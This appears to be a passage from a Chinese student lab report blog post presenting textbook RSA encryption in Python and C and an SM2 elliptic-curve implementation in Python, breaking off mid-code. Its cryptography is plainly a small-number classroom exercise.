id=\"实验摘要\"><a href=\"#实验摘要\" class=\"headerlink\" title=\"实验摘要\"></a>实验摘要</h2><p>利用Python实现RSA的公钥加密、私钥解密过程，运用了扩展欧几里得算法求乘法逆元。RSA利用了大素数分解的数学困难问题，同时用于加密和<a href=\"https://baike.baidu.com/item/数字签名\" target=\"_blank\" rel=\"noopener\">数字签名</a>的算法。</p>\n<h2 id=\"实验过程\"><a href=\"#实验过程\" class=\"headerlink\" title=\"实验过程\"></a>实验过程</h2><p>RSA加密过程：通过选取的随机大素数p和q计算n和n的欧拉函数f_n，选取e作为加密时的指数，将明文m转换成数字计算m**e(mod n)转换成字母得密文c。</p>\n<p>RSA解密过程：计算e在模f_n下的乘法逆元d，将密文c转换成数字计算c**d(mod n)转换成字母得明文m。</p>\n<h2 id=\"代码\"><a href=\"#代码\" class=\"headerlink\" title=\"代码\"></a>代码</h2><h3 id=\"Python3\"><a href=\"#Python3\" class=\"headerlink\" title=\"Python3\"></a>Python3</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> base64</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">RSA</span><span class=\"params\">(object)</span>:</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">__init__</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        self.n = <span class=\"number\">0</span></span><br><span class=\"line\">        self.f_n = <span class=\"number\">0</span></span><br><span class=\"line\">        self.e = <span class=\"number\">0</span></span><br><span class=\"line\">        self.display_list = []</span><br><span class=\"line\">        self.display_str = <span class=\"string\">''</span></span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">work</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        p = <span class=\"number\">2269</span></span><br><span class=\"line\">        q = <span class=\"number\">1427</span></span><br><span class=\"line\">        self.n = p * q</span><br><span class=\"line\">        self.f_n =(p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>)</span><br><span class=\"line\">        self.e = <span class=\"number\">4271</span></span><br><span class=\"line\">        <span class=\"comment\"># 4271</span></span><br><span class=\"line\">        <span class=\"keyword\">while</span> <span class=\"literal\">True</span>:</span><br><span class=\"line\">            func_choice = int(input(<span class=\"string\">'加密请输入1，解密请输入2：'</span>))</span><br><span class=\"line\">            <span class=\"keyword\">if</span> func_choice == <span class=\"number\">1</span>:</span><br><span class=\"line\">                self.display_str = input(<span class=\"string\">'求输入想进行操作的字符串：'</span>)</span><br><span class=\"line\">                self.encrypt()</span><br><span class=\"line\">            <span class=\"keyword\">elif</span> func_choice == <span class=\"number\">2</span>:</span><br><span class=\"line\">                self.display_list = input(<span class=\"string\">'求输入密文，用英文逗号隔开，不需要输入中括号：'</span>).replace(<span class=\"string\">' '</span>, <span class=\"string\">''</span>).split(<span class=\"string\">','</span>)</span><br><span class=\"line\">                self.decrypt()</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                print(<span class=\"string\">'你输入了错误的选项！'</span>)</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">encrypt</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        self.display_list = []</span><br><span class=\"line\">        str_b64 = base64.b64encode(bytes(self.display_str, encoding=<span class=\"string\">'utf-8'</span>))</span><br><span class=\"line\">        list_b64 = list(str_b64)</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> list_b64:</span><br><span class=\"line\">            self.display_list.append((i ** self.e) % self.n)</span><br><span class=\"line\">        print(<span class=\"string\">'密文为：'</span>, self.display_list)</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        self.display_str = <span class=\"string\">''</span></span><br><span class=\"line\">        temp_list = []</span><br><span class=\"line\">        d = self.createPrivateKey()</span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> self.display_list:</span><br><span class=\"line\">            temp_list.append(chr((int(i) ** d) % self.n))</span><br><span class=\"line\">        self.display_str = base64.b64decode(<span class=\"string\">''</span>.join(temp_list)).decode()</span><br><span class=\"line\">        print(<span class=\"string\">'明文为：'</span>, self.display_str)</span><br><span class=\"line\">        </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">createPrivateKey</span><span class=\"params\">(self)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\"># 产生私钥d</span></span><br><span class=\"line\">        temp = self.egcd(self.e, self.f_n)[<span class=\"number\">1</span>]</span><br><span class=\"line\">        <span class=\"keyword\">while</span> temp &lt; <span class=\"number\">0</span>:</span><br><span class=\"line\">            temp += self.f_n</span><br><span class=\"line\">        <span class=\"keyword\">return</span> temp</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">egcd</span><span class=\"params\">(self, a, b)</span>:</span></span><br><span class=\"line\">        <span class=\"comment\"># 扩展欧几里得算法</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> b == <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">return</span> a, <span class=\"number\">1</span>, <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            g, x, y = self.egcd(b, a % b)</span><br><span class=\"line\">            <span class=\"keyword\">return</span> g, y, x - a // b * y</span><br><span class=\"line\">        </span><br><span class=\"line\">        </span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</span><br><span class=\"line\">    rsa = RSA()</span><br><span class=\"line\">    rsa.work()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"image-20200401190010113.png\" alt=\"image-20200401190010113\"></p>\n<h3 id=\"C\"><a href=\"#C\" class=\"headerlink\" title=\"C\"></a>C</h3><figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;math.h&gt;</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> p, q, n, n2, e, d, c, m, ch;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"请输入两个素数：\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;p, &amp;q);</span><br><span class=\"line\">    n = p * q;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> (judege(p) + judege(q)) <span class=\"comment\">//不是素数 则报错</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"错误！输入两个数不是素数\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    n2 = (p - <span class=\"number\">1</span>) * (q - <span class=\"number\">1</span>);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"请选择e,使得e与%d互素且小于%d且大于1：\\n\"</span>, n2, n2);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;e);</span><br><span class=\"line\">    d = cald(e, n2);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"根据e=%d计算d=%d\\n\"</span>, e, d);</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">\"请选择1.加密 2.解密\\n\"</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;ch);</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (ch)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"请输入你要加密的明文数字：\\n\"</span>);</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;m);</span><br><span class=\"line\">        c = en(m, e, n);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"得到的密文：%d\\n\"</span>, c);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> <span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"请输入你要解密的密文数字：\\n\"</span>);</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;m);</span><br><span class=\"line\">        c = dn(m, d, n);</span><br><span class=\"line\">        <span class=\"built_in\">printf</span>(<span class=\"string\">\"得到的明文：%d\"</span>, c);</span><br><span class=\"line\">        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">judege</span><span class=\"params\">(<span class=\"keyword\">int</span> a)</span> <span class=\"comment\">//判断输入的两个数是否是素数</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = <span class=\"number\">2</span>, j = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (; i &lt; a; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (a % i == <span class=\"number\">0</span>)</span><br><span class=\"line\">            j = j + <span class=\"number\">1</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (j &gt;= <span class=\"number\">1</span>)</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">cald</span><span class=\"params\">(<span class=\"keyword\">int</span> b, <span class=\"keyword\">int</span> c)</span> <span class=\"comment\">//计算d</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> i = <span class=\"number\">1</span>;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (; i &lt; c; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> ((i * b) % c == <span class=\"number\">1</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> i;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">en</span><span class=\"params\">(<span class=\"keyword\">int</span> a, <span class=\"keyword\">int</span> b, <span class=\"keyword\">int</span> c)</span> <span class=\"comment\">//加密</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> r, i;</span><br><span class=\"line\">    r = a;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">1</span>; i &lt; b; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        r = r * a;</span><br><span class=\"line\">        r = r % c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">dn</span><span class=\"params\">(<span class=\"keyword\">int</span> a, <span class=\"keyword\">int</span> b, <span class=\"keyword\">int</span> c)</span> <span class=\"comment\">//解密</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">int</span> r, i;</span><br><span class=\"line\">    r = a;</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (i = <span class=\"number\">1</span>; i &lt; b; i++)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        r = r * a;</span><br><span class=\"line\">        r = r % c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> r;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"image-20200401190044716.png\" alt=\"image-20200401190044716\"></p>\n<p><img src=\"image-20200401190051719.png\" alt=\"image-20200401190051719\"></p>\n<h2 id=\"实验总结\"><a href=\"#实验总结\" class=\"headerlink\" title=\"实验总结\"></a>实验总结</h2><p>本程序实现完整RSA功能，注意问题及解决方案为以下几点：</p>\n<ol>\n<li>文字和数字之间的转换，因设计数学运算和文字阅读</li>\n<li>模指数运算来加快运算速度</li>\n<li>素数的选择不再算法本身要考虑的范围内</li>\n</ol>\n<h1 id=\"实现SM2加密算法。给出“we-are-student”的加解密变换结果\"><a href=\"#实现SM2加密算法。给出“we-are-student”的加解密变换结果\" class=\"headerlink\" title=\"实现SM2加密算法。给出“we are student”的加解密变换结果\"></a>实现SM2加密算法。给出“we are student”的加解密变换结果</h1><h2 id=\"实验摘要-1\"><a href=\"#实验摘要-1\" class=\"headerlink\" title=\"实验摘要\"></a>实验摘要</h2><p>根据国密推荐的SM2椭圆曲线公钥密码算法，首先产生随机数计算出曲线点C1，2个32byte的BigInteger大数，即为SM2加密结果的第1部分。第2部分则是真正的密文，是对明文的加密结果，长度和明文一样。第3部分是杂凑值，用来效验数据。按国密推荐的256位椭圆曲线，明文加密结果比原长度会大96byte。</p>\n<h2 id=\"代码-1\"><a href=\"#代码-1\" class=\"headerlink\" title=\"代码\"></a>代码</h2><h3 id=\"Python3-1\"><a href=\"#Python3-1\" class=\"headerlink\" title=\"Python3\"></a>Python3</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> random <span class=\"keyword\">import</span> choice</span><br><span class=\"line\"><span class=\"keyword\">import</span> SM3</span><br><span class=\"line\"></span><br><span class=\"line\">sm2_N = int(<span class=\"string\">'FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFF7203DF6B21C6052B53BBF40939D54123'</span>, <span class=\"number\">16</span>)</span><br><span class=\"line\">sm2_P = int(<span class=\"string\">'FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFF'</span>, <span class=\"number\">16</span>)</span><br><span class=\"line\">sm2_G = <span class=\"string\">'32c4ae2c1f1981195f9904466a39c9948fe30bbff2660be1715a4589334c74c7bc3736a2f4f6779c59bdcee36b692153d0a9877cc62a474002df32e52139f0a0'</span>  <span class=\"comment\"># G点</span></span><br><span class=\"line\">sm2_a = int(<span class=\"string\">'FFFFFFFEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00000000FFFFFFFFFFFFFFFC'</span>,<span class=\"number\">16</span>)</span><br><span class=\"line\">sm2_b = int(<span class=\"string\">'28E9FA9E9D9F5E344D5A9E4BCF6509A7F39789F515AB8F92DDBCBD414D940E93'</span>,<span class=\"number\">16</span>)</span><br><span class=\"line\">sm2_a_3 = (sm2_a + <span class=\"number\">3</span>) % sm2_P</span><br><span class=\"line\">Fp = <span class=\"number\">256</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># sm2_N = int('BDB6F4FE3E8B1D9E0DA8C0D40FC962195DFAE76F56564677', 16)</span></span><br><span class=\"line\"><span class=\"comment\"># sm2_P = int('BDB6F4FE3E8B1D9E0DA8C0D46F4C318CEFE4AFE3B6B8551F', 16)</span></span><br><span class=\"line\"><span class=\"comment\"># sm2_G = '4AD5F7048DE709AD51236DE65E4D4B482C836DC6E410664002BB3A02D4AAADACAE24817A4CA3A1B014B5270432DB27D2'# G点</span></span><br><span class=\"line\"><span class=\"comment\"># sm2_a = int('BB8E5E8FBC115E139FE6A814FE48AAA6F0ADA1AA5DF91985',16)</span></span><br><span class=\"line\"><span class=\"comment\"># sm2_b = int('1854BEBDC31B21B7AEFC80AB0ECD10D5B1B3308E6DBF11C1',16)</span></span><br><span class=\"line\"><span class=\"comment\"># sm2_a_3 = (sm2_a + 3) % sm2_P</span></span><br><span class=\"line\"><span class=\"comment\"># Fp = 192</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_random_str</span><span class=\"params\">(strlen)</span>:</span></span><br><span class=\"line\">    letterlist = [<span class=\"string\">'0'</span>,<span class=\"string\">'1'</span>,<span class=\"string\">'2'</span>,<span class=\"string\">'3'</span>,<span class=\"string\">'4'</span>,<span class=\"string\">'5'</span>,<span class=\"string\">'6'</span>,<span class=\"string\">'7'</span>,<span class=\"string\">'8'</span>,<span class=\"string\">'9'</span>,<span class=\"string\">'a'</span>,<span class=\"string\">'b'</span>,<span class=\"string\">'c'</span>,<span class=\"string\">'d'</span>,<span class=\"string\">'e'</span>,<span class=\"string\">'f'</span>]</span><br><span class=\"line\">    str = <span class=\"string\">''</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(strlen):</span><br><span class=\"line\">        a = choice(letterlist)</span><br><span class=\"line\">        str = <span class=\"string\">'%s%s'</span> % (str,a)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> str</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">kG</span><span class=\"params\">(k, Point,len_para)</span>:</span>  <span class=\"comment\"># kP运算</span></span><br><span class=\"line\">    Point = <span class=\"string\">'%s%s'</span> % (Point, <span class=\"string\">'1'</span>)</span><br><span class=\"line\">    mask_str = <span class=\"string\">'8'</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len_para<span class=\"number\">-1</span>):</span><br><span class=\"line\">        mask_str += <span class=\"string\">'0'</span></span><br><span class=\"line\">    <span class=\"comment\"># print(mask_str)</span></span><br><span class=\"line\">    mask = int(mask_str, <span class=\"number\">16</span>)</span><br><span class=\"line\">    Temp = Point</span><br><span class=\"line\">    flag = <span class=\"literal\">False</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> range(len_para * <span class=\"number\">4</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (flag):</span><br><span class=\"line\">            Temp = DoublePoint(Temp,len_para)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (k &amp; mask) != <span class=\"number\">0</span>:</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (flag):</span><br><span class=\"line\">                Temp = AddPoint(Temp, Point,len_para)</span><br><span class=\"line\">            <span class=\"keyword\">else</span>:</span><br><span class=\"line\">                flag = <span class=\"literal\">True</span></span><br><span class=\"line\">                Temp = Point</span><br><span class=\"line\">        k = k &lt;&lt; <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> ConvertJacb2Nor(Temp,len_para)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 倍点运算</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">DoublePoint</span><span class=\"params\">(Point,len_para)</span>:</span></span><br><span class=\"line\">    l = len(Point)</span><br><span class=\"line\">    len_2 = <span class=\"number\">2</span> * len_para</span><br><span class=\"line\">    <span class=\"keyword\">if</span> l&lt; len_para*<span class=\"number\">2</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        x1 = int(Point[<span class=\"number\">0</span>:len_para], <span class=\"number\">16</span>)</span><br><span class=\"line\">        y1 = int(Point[len_para:len_2], <span class=\"number\">16</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> l == len_2:</span><br><span class=\"line\">            z1 = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            z1 = int(Point[len_2:], <span class=\"number\">16</span>)</span><br><span class=\"line\">        T6 = (z1 * z1) % sm2_P</span><br><span class=\"line\">        T2 = (y1 * y1) % sm2_P</span><br><span class=\"line\">        T3 = (x1 + T6) % sm2_P</span><br><span class=\"line\">        T4 = (x1 - T6) % sm2_P</span><br><span class=\"line\">        T1 = (T3 * T4) % sm2_P</span><br><span class=\"line\">        T3 = (y1 * z1) % sm2_P</span><br><span class=\"line\">        T4 = (T2 * <span class=\"number\">8</span>) % sm2_P</span><br><span class=\"line\">        T5 = (x1 * T4) % sm2_P</span><br><span class=\"line\">        T1 = (T1 * <span class=\"number\">3</span>) % sm2_P</span><br><span class=\"line\">        T6 = (T6 * T6) % sm2_P</span><br><span class=\"line\">        T6 = (sm2_a_3 * T6) % sm2_P</span><br><span class=\"line\">        T1 = (T1 + T6) % sm2_P</span><br><span class=\"line\">        z3 = (T3 + T3) % sm2_P</span><br><span class=\"line\">        T3 = (T1 * T1) % sm2_P</span><br><span class=\"line\">        T2 = (T2 * T4) % sm2_P</span><br><span class=\"line\">        x3 = (T3 - T5) % sm2_P</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (T5 % <span class=\"number\">2</span>) == <span class=\"number\">1</span>:</span><br><span class=\"line\">            T4 = (T5 + ((T5 + sm2_P) &gt;&gt; <span class=\"number\">1</span>) - T3) % sm2_P</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            T4 = (T5 + (T5 &gt;&gt; <span class=\"number\">1</span>) - T3) % sm2_P</span><br><span class=\"line\"></span><br><span class=\"line\">        T1 = (T1 * T4) % sm2_P</span><br><span class=\"line\">        y3 = (T1 - T2) % sm2_P</span><br><span class=\"line\"></span><br><span class=\"line\">        form = <span class=\"string\">'%%0%dx'</span> % len_para</span><br><span class=\"line\">        form = form * <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> form % (x3, y3, z3)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 点加函数，P2点为仿射坐标即z=1，P1为Jacobian加重射影坐标</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">AddPoint</span><span class=\"params\">(P1, P2, len_para)</span>:</span></span><br><span class=\"line\">    len_2 = <span class=\"number\">2</span> * len_para</span><br><span class=\"line\">    l1 = len(P1)</span><br><span class=\"line\">    l2 = len(P2)</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (l1 &lt; len_2) <span class=\"keyword\">or</span> (l2 &lt; len_2):</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">None</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        X1 = int(P1[<span class=\"number\">0</span>: len_para], <span class=\"number\">16</span>)</span><br><span class=\"line\">        Y1 = int(P1[len_para: len_2], <span class=\"number\">16</span>)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (l1 == len_2):</span><br><span class=\"line\">            Z1 = <span class=\"number\">1</span></span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            Z1 = int(P1[len_2:], <span class=\"number\">16</span>)</span><br><span class=\"line\">        x2 = int(P2[<span class=\"number\">0</span>:len_para], <span class=\"number\">16</span>)</span><br><span class=\"line\">        y2 = int(P2[len_para:len_2], <span class=\"number\">16</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        T1 = (Z1 * Z1) % sm2_P</span><br><span class=\"line\">        T2 = (y2 * Z1) % sm2_P</span><br><span class=\"line\">        T3 = (x2 * T1) % sm2_P</span><br><span class=\"line\">        T1 = (T1 * T2) % sm2_P</span><br><span class=\"line\">        T2 = (T3 - X1) % sm2_P</span><br><span class=\"line\">        T3 = (T3 + X1) % sm2_P</span><br><span class=\"line\">        T4 = (T2 * T2) % sm2_P</span><br><span class=\"line\">        T1 = (T1 - Y1) % sm2_P</span><br><span class=\"line\">        Z3 = (Z1 * T2) % sm2_P</span><br><span class=\"line\">        T2 = (T2 * T4) % sm2_P</span><br><span class=\"line\">        T3 = (T3 * T4) % sm2_P</span><br><span class=\"line\">        T5 = (T1 * T1) % sm2_P</span><br><span class=\"line\">        T4 = (X1 * T4) % sm2_P</span><br><span class=\"line\">        X3 = (T5 - T3) % sm2_P</span><br><span class=\"line\">        T2 = (Y1 * T2) % sm2_P</span><br><span class=\"line\">        T3 = (T4 - X3) % sm2_P</span><br><span class=\"line\">        T1 = (T1 * T3) % sm2_P</span><br><span class=\"line\">        Y3 = (T1 - T2) % sm2_P</span><br><span class=\"line\"></span><br><span class=\"line\">        form = <span class=\"string\">'%%0%dx'</span> % len_para</span><br><span class=\"line\">        form = form * <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> form % (X3, Y3, Z3)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">ConvertJacb2Nor</span><span class=\"params\">(Point,len_para)</span>:</span> <span class=\"comment\"># Jacobian加重射影坐标转换成仿射坐标</span></span><br><span class=\"line\">    len_2 = <span class=\"number\">2</span> * len_para</span><br><span class=\"line\">    x = int(Point[<span class=\"number\">0</span>:len_para], <span class=\"number\">16</span>)</span><br><span class=\"line\">    y = int(Point[len_para:len_2], <span class=\"number\">16</span>)</span><br><span class=\"line\">    z = int(Point[len_2:], <span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"comment\"># z_inv = Inverse(z, P)</span></span><br><span class=\"line\">    z_inv = pow(z, sm2_P - <span class=\"number\">2</span>, sm2_P)</span><br><span class=\"line\">    z_invSquar = (z_inv * z_inv) % sm2_P</span><br><span class=\"line\">    z_invQube = (z_invSquar * z_inv) % sm2_P</span><br><span class=\"line\">    x_new = (x * z_invSquar) % sm2_P</span><br><span class=\"line\">    y_new = (y * z_invQube) % sm2_P</span><br><span class=\"line\">    z_new = (z * z_inv) % sm2_P</span><br><span class=\"line\">    <span class=\"keyword\">if</span> z_new == <span class=\"number\">1</span>:</span><br><span class=\"line\">        form = <span class=\"string\">'%%0%dx'</span> % len_para</span><br><span class=\"line\">        form = form * <span class=\"number\">2</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> form % (x_new, y_new)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">'Convert Error'</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 可逆，可用pow()代替</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Inverse</span><span class=\"params\">(data, M,len_para)</span>:</span></span><br><span class=\"line\">    tempM = M - <span class=\"number\">2</span></span><br><span class=\"line\">    mask_str = <span class=\"string\">'8'</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len_para - <span class=\"number\">1</span>):</span><br><span class=\"line\">        mask_str += <span class=\"string\">'0'</span></span><br><span class=\"line\">    mask = int(mask_str, <span class=\"number\">16</span>)</span><br><span class=\"line\">    tempA = <span class=\"number\">1</span></span><br><span class=\"line\">    tempB = data</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len_para*<span class=\"number\">4</span>):</span><br><span class=\"line\">        tempA = (tempA * tempA) % M</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (tempM &amp; mask) != <span class=\"number\">0</span>:</span><br><span class=\"line\">            tempA = (tempA * tempB) % M</span><br><span class=\"line\">        mask = mask &gt;&gt; <span class=\"number\">1</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> tempA</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 验签函数，Sign签名r||s，E消息hash，PA公钥</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">Verify</span><span class=\"params\">(Sign, E, PA,len_para)</span>:</span></span><br><span class=\"line\">    r = int(Sign[<span class=\"number\">0</span>:len_para], <span class=\"number\">16</span>)</span><br><span class=\"line\">    s = int(Sign[len_para:<span class=\"number\">2</span>*len_para], <span class=\"number\">16</span>)</span><br><span class=\"line\">    e = int(E, <span class=\"number\">16</span>)</span><br><span class=\"line\">    t = (r + s) % sm2_N</span><br><span class=\"line\">    P1 = kG(s, sm2_G,len_para)</span><br><span class=\"line\">    P2 = kG(t, PA,len_para)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> P1 == P2:</span><br><span class=\"line\">        P1 = <span class=\"string\">'%s%s'</span> % (P1, <span class=\"number\">1</span>)</span><br><span class=\"line\">        P1 = DoublePoint(P1,len_para)</span><br><span class=\"line\">    <span class=\"keyword\">else</span>:</span><br><span class=\"line\">        P1 = <span class=\"string\">'%s%s'</span> % (P1, <span class=\"number\">1</span>)</span><br><span 